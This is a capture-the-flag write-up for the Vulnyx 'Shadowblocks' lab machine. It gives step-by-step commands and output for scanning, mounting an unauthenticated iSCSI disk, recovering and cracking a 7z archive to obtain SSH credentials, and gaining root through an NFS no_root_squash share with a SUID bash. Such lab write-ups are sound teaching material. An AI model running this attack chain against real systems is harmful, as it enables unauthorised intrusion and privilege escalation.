---
title: "Vulnyx Shadowblocks Writeup"
date: 2026-04-19 12:42:00 +0000
categories: [Vulnyx, Writeups]
tags: [vulnyx, ctf]
description: "Exploiting storage misconfigurations to compromise the Shadowblocks machine."
image:
  path: /assets/img/posts/vulnyx/shadowblocks/shadowblocks.png
---



## Reconnaissance — Port Scan

We start with a fast SYN scan across all ports to discover which ones are open on the target machine.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n 192.168.0.15
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 18:09 +0100
Initiating ARP Ping Scan at 18:09
Scanning 192.168.0.15 [1 port]
Completed ARP Ping Scan at 18:09, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:09
Scanning 192.168.0.15 [65535 ports]
Discovered open port 22/tcp on 192.168.0.15
Discovered open port 3260/tcp on 192.168.0.15
Completed SYN Stealth Scan at 18:09, 26.38s elapsed (65535 total ports)
Nmap scan report for 192.168.0.15
Host is up, received arp-response (0.00040s latency).
Scanned at 2026-03-02 18:09:21 CET for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
3260/tcp open  iscsi   syn-ack ttl 64
MAC Address: 08:00:27:A3:FE:DF (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
           Raw packets sent: 131089 (5.768MB) | Rcvd: 23 (996B)
```



## Reconnaissance — Service Versions & Scripts

We run a deeper scan on the discovered ports to fingerprint service versions and spot potential attack vectors.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ nmap -sCV 192.168.0.15 -p22,3260                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-02 18:10 +0100
Nmap scan report for moto-pasion.thl (192.168.0.15)
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
3260/tcp open  iscsi   Synology DSM iSCSI
| iscsi-info: 
|   iqn.2026-02.nyx.shadowblocks:storage.disk1: 
|     Address: 192.168.0.15:3260,1
|_    Authentication: NOT required
MAC Address: 08:00:27:A3:FE:DF (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.22 seconds
```


## Reconnaissance — iSCSI Discovery

Since port 3260 (iSCSI) is open, we use `iscsiadm` to discover available iSCSI targets on the server.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo iscsiadm --mode discovery --type sendtargets --portal 192.168.0.15
192.168.0.15:3260,1 iqn.2026-02.nyx.shadowblocks:storage.disk1
```


## Reconnaissance — iSCSI Enumeration

We grab further details about the discovered iSCSI target.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo iscsiadm -m discovery -p 192.168.0.15
# BEGIN RECORD 2.1.11
discovery.startup = manual
discovery.type = sendtargets
discovery.sendtargets.address = 192.168.0.15
discovery.sendtargets.port = 3260
discovery.sendtargets.auth.authmethod = None
discovery.sendtargets.auth.username = <empty>
discovery.sendtargets.auth.password = <empty>
discovery.sendtargets.auth.username_in = <empty>
discovery.sendtargets.auth.password_in = <empty>
node.session.auth.chap_algs = MD5
discovery.sendtargets.timeo.login_timeout = 15
discovery.sendtargets.use_discoveryd = No
discovery.sendtargets.discoveryd_poll_inval = 30
discovery.sendtargets.reopen_max = 5
discovery.sendtargets.timeo.auth_timeout = 45
discovery.sendtargets.timeo.active_timeout = 30
discovery.sendtargets.iscsi.MaxRecvDataSegmentLength = 32768
# END RECORD
```


## Exploitation — Mounting iSCSI

We log into the iSCSI target node. This action attaches the remote storage as a local block device on our attacking machine.

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo iscsiadm --mode node --targetname iqn.2026-02.nyx.shadowblocks:storage.disk1 --portal 192.168.0.15 --login
Login to [iface: default, target: iqn.2026-02.nyx.shadowblocks:storage.disk1, portal: 192.168.0.15,3260] successful.
```



## Post-exploitation — Inspecting New Disks

We run `fdisk -l` to identify the newly attached iSCSI disk structure and partitions (e.g., `/dev/sda1`).

```bash
┌──(suraxddq㉿kali)-[~]
└─$ sudo fdisk -l         
Disk /dev/nvme0n1: 953.87 GiB, 1024209543168 bytes, 2000409264 sectors
Disk model: WDC PC SN730 SDBQNTY-1T00-1001          
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 0A295AA8-9E09-4568-BB6E-E87D10190005

Device              Start        End    Sectors   Size Type
/dev/nvme0n1p1       2048    2000895    1998848   976M EFI System
/dev/nvme0n1p2    2000896 1897277439 1895276544 903.7G Linux filesystem
/dev/nvme0n1p3 1897277440 2000408575  103131136  49.2G Linux swap


Disk /dev/sda: 150 MiB, 157286400 bytes, 307200 sectors
Disk model: shadowblocks    
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 8388608 bytes
Disklabel type: dos
Disk identifier: 0x2566cb3e

Device     Boot Start    End Sectors  Size Id Type
/dev/sda1        2048 307199  305152  149M 83 Linux
```


## Post-exploitation — Creating Mount Point

We create a directory to mount the newly discovered file system.

```bash
mkdir /mnt/iscsi_share
```
 



## Post-exploitation — Mounting the File System

We mount the iSCSI partition onto our newly created directory, allowing us to interact with the files.

```bash
┌──(suraxddq㉿kali)-[/mnt]
└─$ sudo mount /dev/sda1 /mnt/iscsi_share
mount: /mnt/iscsi_share: WARNING: source write-protected, mounted read-only.
```



## Post-exploitation — Examining File System

We navigate to the mounted directory and use `tree` to list all its contents, identifying interesting folders like `backups` and `configs`.

```bash
┌──(suraxddq㉿kali)-[/mnt/iscsi_share]
└─$ cd /mnt/iscsi_share 
  
┌──(suraxddq㉿kali)-[/mnt/iscsi_share]
└─$ tree
.
├── backups
│   ├── backup_february_2026.bak
│   └── backup_january_2026.bak
├── configs
│   └── storage.conf
├── docs
│   └── company_overview.txt
├── engineering
│   └── infrastructure_notes.txt
├── finance
│   └── budget_2026.txt
├── hr
│   └── employees.txt
├── logs
│   └── system.log
├── lost+found  [error opening dir]
└── random_fill.bin

9 directories, 9 files
```


## Post-exploitation — Data Recovery

We use `photorec` on the raw disk partition to recover deleted or lost files, outputting them into `/tmp`.

```bash
┌──(suraxddq㉿kali)-[/mnt/iscsi_share]
└─$ sudo photorec /dev/sda1
proced
enter
whole
output /tmp
```


## Post-exploitation — Analyzing Recovered Files

We examine the files recovered by `photorec` and find some compressed `.7z` archives and text files.

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ ls -l
total 44
-rw-r--r-- 1 root root   480 Mar  2 18:21 f0018434.7z
-rw-r--r-- 1 root root   399 Mar  2 18:21 f0018436.txt
-rw-r--r-- 1 root root   358 Mar  2 18:21 f0018438.txt
-rw-r--r-- 1 root root   434 Mar  2 18:21 f0018440.txt
-rw-r--r-- 1 root root   274 Mar  2 18:21 f0018442.txt
-rw-r--r-- 1 root root   402 Mar  2 18:21 f0018444.txt
-rw-r--r-- 1 root root   282 Mar  2 18:21 f0018446.txt
-rw-r--r-- 1 root root   480 Mar  2 18:21 f0018448.7z
-rw-r--r-- 1 root root 10003 Mar  2 18:21 report.xml
```


## Post-exploitation — Extracting 7z Hash

We use `7z2john` to extract a crackable password hash from one of the retrieved 7z archives (`f0018448.7z`).

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ 7z2john f0018448.7z > /tmp/hash
```


## Post-exploitation — Cracking 7z Password

We use John the Ripper along with the RockYou wordlist to crack the 7z archive hash, which reveals the password "donald".

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash 
Created directory: /home/suraxddq/.john
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 6 for all loaded hashes
Cost 3 (compression type) is 0 for all loaded hashes
Cost 4 (data length) is 122 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
donald           (f0018448.7z)     
1g 0:00:00:05 DONE (2026-03-02 18:22) 0.1776g/s 187.5p/s 187.5c/s 187.5C/s marie1..stars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```



## Post-exploitation — Extracting 7z contents

We extract the 7z archive using the newly cracked password.

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ 7z x f0018448.7z -o/tmp    

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 480 bytes (1 KiB)

Extracting archive: f0018448.7z

Enter password (will not be echoed):
--
Path = f0018448.7z
Type = 7z
Physical Size = 480
Headers Size = 208
Method = LZMA2:12 7zAES
Solid = -
Blocks = 1

Everything is Ok

Size:       338
Compressed: 480
```


## Post-exploitation — Reading Credentials

One of the extracted files contains valid internal access credentials for the `lenam` user.

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ cat ../credentials.txt 
ShadowBlocks Internal Access Credentials
=======================================

System: Primary Storage Node
Environment: Production
Access Level: Administrative

Username: lenam
Password: 3vEbN3bM6NhOa1640weG

Note:
This file is intended for temporary migration procedures only.
It must be deleted after use.
Last reviewed: 2026-02-15
```


## Lateral Movement — SSH Access

We use the discovered credentials to log into the server via SSH.

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ ssh lenam@192.168.0.15                       
lenam@192.168.0.15's password: 
Linux shadowblocks 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar  1 20:08:48 2026 from 192.168.0.11
lenam@shadowblocks:~$
```


## Flags — User

Once connected, we read the user flag for `lenam`.

```bash
lenam@shadowblocks:/srv/nfs$ cat /home/lenam/user.txt 
c94a424c****
```


## System Enumeration — Checking NFS

We examine `/etc/exports` and discover an NFS export configured with `no_root_squash` and `insecure`, which is a critical misconfiguration that allows privilege escalation.

```bash
lenam@shadowblocks:~$ cat /etc/exports 
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/srv/nfs *(rw,sync,fsid=0,no_subtree_check,no_root_squash,insecure)
```



## Privilege Escalation — Port Forwarding

To exploit the NFS share, we first create an SSH tunnel to forward our local port 2049 to the server's NFS port (2049).

```bash
┌──(suraxddq㉿kali)-[/tmp/recup_dir.1]
└─$ ssh -L 2049:127.0.0.1:2049 lenam@192.168.0.15
lenam@192.168.0.15's password: 
Linux shadowblocks 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Mar  2 18:30:40 2026 from 192.168.0.11
lenam@shadowblocks:~$ 
```


## Privilege Escalation — Mounting NFS

We mount the forwarded NFS share on our local Kali machine as root.

```bash
┌──(root㉿kali)-[/tmp]
└─# sudo mount -t nfs -o vers=4,nolock 127.0.0.1:/ /tmp/nfs
```



## Privilege Escalation — Copying SUID Bash

Since `no_root_squash` is active, files we create as local root on the NFS share will be owned by root on the target server. We copy `/bin/bash` to the share and give it SUID permissions.

```bash
┌──(root㉿kali)-[/tmp/nfs]
└─# ls -l   
total 1352
-rwsr-sr-x 1 root root 1380656 Mar  1 20:12 bash
-rw-rw-r-- 1 root root       0 Feb 28 21:20 text.txt
                                                                                                                    
┌──(root㉿kali)-[/tmp/nfs]
└─# cp -v /bin/bash .
'/bin/bash' -> './bash'
                                                                                                                    
┌──(root㉿kali)-[/tmp/nfs]
└─# chmod +s bash   
```


## Privilege Escalation — Exploiting SUID Bash

Back on our SSH session as `lenam`, we check the NFS share directory. The `bash` binary is now present with root SUID permissions.

```bash
lenam@shadowblocks:/srv/nfs$ ls -l
total 1352
-rwsr-sr-x 1 root root 1380656 mar  2 18:42 bash
-rw-rw-r-- 1 root root       0 feb 28 21:20 text.txt
```


## Flags — Root

We execute the SUID bash binary with `-p` to maintain privileges, gaining a root shell to read the final flag.

```bash
lenam@shadowblocks:/srv/nfs$ ./bash -p
bash-5.3# cd /root/
bash-5.3# ls -l
total 4
-r-------- 1 root root 33 feb 28 02:34 root.txt
bash-5.3# cat root.txt 
402482f*****
```
